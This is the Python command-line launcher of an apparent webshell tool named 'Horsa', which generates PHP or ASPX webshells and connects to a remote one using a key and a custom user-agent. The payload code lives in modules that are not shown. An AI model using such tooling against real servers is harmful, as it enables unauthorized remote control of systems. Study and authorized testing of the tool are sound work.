import argparse
import sys
from colorama import Fore
from core.config import banner
from core.session import Session


if __name__ == '__main__':

    parser = argparse.ArgumentParser()
    parser.add_argument("--generate", action="store_true", help="create a Horsa webshell")
    parser.add_argument("--interact", action="store_true", help="interact with an Horsa webshell")
    parser.add_argument("--key", action="store", help="specify a key to encrypt data and authenticate with Horsa webshell", type=str, required=True)
    parser.add_argument("--lang", action="store", help="select a language between php or aspx", type=str, required=True)
    parser.add_argument("--url", action="store", help="location of remote Horsa webshell", type=str, required=True)
    parser.add_argument("--ua", action="store", help="select a different user-agent other than the default", default="hora-ws", type=str)
    args = parser.parse_args() # Declare arguments object to args

    banner()
    
    if len(sys.argv[1:])==0: # Show help if required arg not included
        parser.print_help()        
        parser.exit()

    session = Session(args.url, args.ua, args.lang, args.key)
    if args.interact:
            session.check_ws()
            session.interact()
    if args.generate:
            session.generate()
    else:
        print(Fore.RED + "[!]" + Fore.WHITE + " No mode selected. Choose between --interact or --generate when running Horsa. More information below:")
        print()
        parser.print_help()        
        parser.exit()
